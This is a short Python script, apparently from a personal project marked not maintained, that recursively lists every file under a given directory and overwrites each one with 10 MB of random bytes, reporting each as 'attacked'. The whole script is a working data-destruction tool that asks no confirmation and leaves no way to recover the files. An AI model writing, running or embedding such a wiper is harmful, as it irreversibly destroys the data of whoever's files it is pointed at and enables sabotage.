"""
Author: Rishav Das
Created on: May, 2026

NOT-MAINTAINED
"""

import os
from sys import argv as argument

def fileLister(dirloc=None):
    # Avoid mutable default arguments (good practice)
    if dirloc is None:
        dirloc = os.getcwd()    
    
    all_files = []
    
    for root, dirs, filenames in os.walk(dirloc):
        for file in filenames:
            full_path = os.path.join(root, file)
            all_files.append(full_path)            
    return all_files

def corrupter(file, size_MB = 10):
    target_bytes = size_MB * 1024 * 1024
    chunk_size = 10 * 1024 * 1024 
    bytes_written = 0

    with open(file, 'wb') as f:
        while bytes_written < target_bytes:
            current_chunk = min(chunk_size, target_bytes - bytes_written)
            junk_data = os.urandom(current_chunk)

            f.write(junk_data)
            bytes_written += current_chunk

    print(f"[\033[0;92m~\033[0m] File attacked: \033[0;92m{file}\033[0m")

if __name__ == "__main__":
	try:
		try:
			# Checking if the user has given a directory location in the argument
			files = argument[1]
		except IndexError:
			files = input("Enter the directory location: ")
	
		if os.path.isdir(files):
			print("\nAttacking directory at \033[0;93m%s\033[0m" %files)
			files = fileLister(dirloc = files)
			for file in files:
				corrupter(file)
			print()
		elif os.path.isfile(files):
			corrupter(files)
		else:
			print("[ Error: directory location not found ]")
	except Exception as error:
		print(f"[ {error} ]")
